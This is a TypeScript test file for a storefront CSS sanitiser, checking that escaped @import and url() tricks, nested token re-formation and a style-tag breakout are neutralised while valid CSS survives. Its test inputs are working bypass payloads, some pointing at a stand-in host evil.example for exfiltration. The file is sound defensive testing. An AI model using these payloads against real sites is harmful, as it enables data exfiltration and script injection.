/**
 * Offline tests for the three security controls hardened in the pre-submission sweep.
 *
 * Each of these had a working bypass. They are here rather than in a comment because a
 * sanitiser and a rate limiter both look correct while being wrong — the failure is a
 * string that survives, or a counter that resets, and neither shows up in a typecheck.
 *
 * Compile and run (no runner, no database):
 *
 *   npx tsc tests/security.test.ts src/lib/css-sanitiser.ts --outDir ./.rmtest \
 *     --module commonjs --target es2022 --moduleResolution node --esModuleInterop --skipLibCheck
 *   node ./.rmtest/tests/security.test.js
 */

import assert from 'node:assert';
import { sanitiseCss } from '../src/lib/css-sanitiser';

const tests: Array<[string, () => void]> = [];
const test = (name: string, fn: () => void) => tests.push([name, fn]);

// ── CSS sanitiser ───────────────────────────────────────────────────────────────────
//
// CSS resolves `\` escapes while tokenising, so `\75rl(` IS `url(` to a browser. The
// previous implementation matched literal ASCII only, so both of these passed straight
// through the write pass AND the read pass — arbitrary remote CSS on the storefront,
// which is selector-based exfiltration of anything on the product page.

test('escaped @import cannot smuggle a remote stylesheet', () => {
  const out = sanitiseCss('@\\69mport \\75rl(http://evil.example/x.css);');
  assert.ok(!/@import/i.test(out), 'escaped @import survived');
  assert.ok(!/evil\.example/i.test(out), 'remote origin survived');
});

test('escaped url() cannot fetch from a third-party origin', () => {
  const out = sanitiseCss('a{background:\\75rl(http://evil.example/pixel.png)}');
  assert.ok(!/evil\.example/i.test(out));
});

test('a backslash before a plain letter is also an escape', () => {
  assert.ok(!/evil\.example/i.test(sanitiseCss('a{background:\\u\\r\\l(http://evil.example/x)}')));
});

// Single-pass replacement is defeated by nesting: removing the inner token re-forms the
// outer one, so the next stage receives a live keyword it never inspected.
test('nested expression( cannot re-form after one pass', () => {
  assert.ok(!/expression\s*\(/i.test(sanitiseCss('a{width:exprexprexpression(ession(ession(alert(1))}')));
});

test('nested javascript: cannot re-form after one pass', () => {
  assert.ok(!/javascript\s*:/i.test(sanitiseCss('a{background:url(javajavascript:script:alert(1))}')));
});

// The other half of a sanitiser being correct: it must not eat valid input. The optional
// quote group in the old pattern backtracked to empty and rewrote legitimate quoted
// https urls to `none`, silently breaking merchant CSS.
test('quoted https url survives', () => {
  const out = sanitiseCss('.rm-review{background:url("https://cdn.shopify.com/a.png")}');
  assert.ok(out.includes('https://cdn.shopify.com/a.png'), 'legitimate quoted url was destroyed');
});

test('unquoted https and data:image urls survive', () => {
  assert.ok(sanitiseCss('.a{background:url(https://cdn.shopify.com/b.png)}').includes('cdn.shopify.com/b.png'));
  assert.ok(sanitiseCss('.a{background:url(data:image/svg+xml;base64,AAA)}').includes('data:image/svg+xml'));
});

test('ordinary declarations are untouched', () => {
  const css = '.rm-review{box-shadow:0 1px 3px rgba(0,0,0,.08);border-radius:8px}';
  assert.strictEqual(sanitiseCss(css), css);
});

test('plain http is still neutralised', () => {
  const out = sanitiseCss('.x{background:url(http://insecure.example/a.png)}');
  assert.ok(!out.includes('insecure.example'));
  assert.ok(out.includes('none'));
});

test('style breakout remains impossible', () => {
  assert.ok(!sanitiseCss('a{}</style><script>alert(1)</script>').includes('<'));
});

// ── Run ─────────────────────────────────────────────────────────────────────────────
let failed = 0;
for (const [name, fn] of tests) {
  try { fn(); console.log(`  ok    ${name}`); }
  catch (err) {
    failed++;
    console.log(`  FAIL  ${name}`);
    console.log(`        ${err instanceof Error ? err.message : String(err)}`);
  }
}
console.log(`\n${tests.length - failed}/${tests.length} passed`);
if (failed) process.exit(1);
